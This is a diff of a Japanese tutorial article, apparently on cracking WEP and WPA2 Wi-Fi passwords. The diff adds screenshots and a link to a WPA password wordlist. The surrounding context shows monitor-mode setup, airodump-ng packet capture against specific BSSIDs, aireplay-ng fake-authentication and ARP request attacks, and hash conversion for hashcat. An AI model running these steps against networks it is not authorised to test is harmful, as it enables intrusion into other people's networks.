@@ -106,6 +106,7 @@ sudo iwconfig wlan0 mode monitor
 sudo ip link set wlp2s0 up
 sudo iwconfig
 ```
+![monitormode](https://github.com/RyosukeDTomita/article/blob/master/picture/monitor.jpg)
 #### モニターモードから元に戻す
 - コンピュータを再起動することでモニターモードから抜けられる。ハッキングが終わった後は再起動するのがおすすめ。
 - もしくは、airmon-ngをstopしてもよい。
@@ -148,6 +149,7 @@ sudo airodump-ng --bssid 1E:B1:7F:14:0C:01 --channel 13 --write wep wlp2s0mon
 - Data: 収集したパケットの量。
 - アクセスしている端末のMACアドレスが下に表示される。
 
+![packet2](https://github.com/RyosukeDTomita/article/blob/master/picture/packet2.jpg)
 ### パスワード解析を開始
 - 一度実行すれば、パケットが溜まったらすぐに実行してくれるので何度も実行しなくていい。
 
@@ -179,6 +181,7 @@ sudo ip link set dev wlp2s0mon up
 #### ARPリクエスト攻撃を実行
 - ARPリクエストを無限に送ってパケットをためやすくする。
 - MACアドレスフィルタリングがついていると失敗する。
+![arprequestimage](https://github.com/RyosukeDTomita/article/blob/master/picture/arprequest.jpg)
 
 ```shell
 sudo aireplay-ng --fakeauth 0 -a 00:01:8E:55:F8:5F -h 22:38:fc:d9:cc:91 wlp2s0mon #偽の認証を行う。 -aに攻撃対象のBSSID,-hを自分のMACアドレスを指定する。
@@ -241,7 +244,7 @@ hcxpcapngtool --hccapx=hoge wpa2-01.cap # --hcccapx=で出力の名前を決定(
 ```
 
 #### Wi-FIパスワードリストとなる辞書用意する。
-- probable-v2-wpa-top4800.txtなどが有名らしい。Githubからダウンロード可能。
+- [probable-v2-wpa-top4800.txt](https://github.com/berzerk0/Probable-Wordlists/blob/master/Real-Passwords/WPA-Length/Top4800-WPA-probable-v2.txt)などが有名らしい。Githubからダウンロード可能。
 - defaultのパスワードは桁数も多く、hashcatによって解析することは難しい。
 - しかし、ユーザがカスタムしたパスワードであれば脆弱なパスワードが使用されている可能性がある。SSIDがカスタムされている場合にはパスワードも変更されている可能性が高い。
 
